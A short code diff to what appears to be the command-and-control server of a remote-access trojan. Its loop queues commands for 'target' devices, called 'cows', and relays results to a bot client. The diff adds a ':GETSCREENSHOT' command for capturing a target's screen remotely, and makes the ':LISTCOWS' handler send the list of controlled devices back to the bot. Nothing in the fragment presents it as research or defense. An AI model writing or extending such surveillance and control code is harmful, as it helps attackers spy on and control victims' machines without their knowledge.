@@ -68,9 +68,16 @@ while True:
         pending_command[target] = ":COMMAND :GETINFO"  # Queue it
         print(f"[+] Queued :GETINFO for {target}")
 
+    elif msg.startswith(":GETSCREENSHOT"):
+        target = lines[1]  # Name of the target device
+        pending_command[target] = ":COMMAND :GETSCREENSHOT"  # Queue it
+        print(f"[+] Queued :GETSCREENSHOT for {target}")
+
     # ========== Handle :LISTCOWS ==========
     elif msg.startswith(":LISTCOWS"):
         print(DeviceIDList)  # Just log it; actual response sent to bot
+        cows_list = "\n".join(DeviceIDList)  # Join the list into a string, separated by new lines
+        client_socket.sendall(cows_list.encode())  # Send the list to the bot.py
 
     # ========== Handle :FETCHRESPONSE ==========
     elif msg.startswith(":FETCHRESPONSE"):
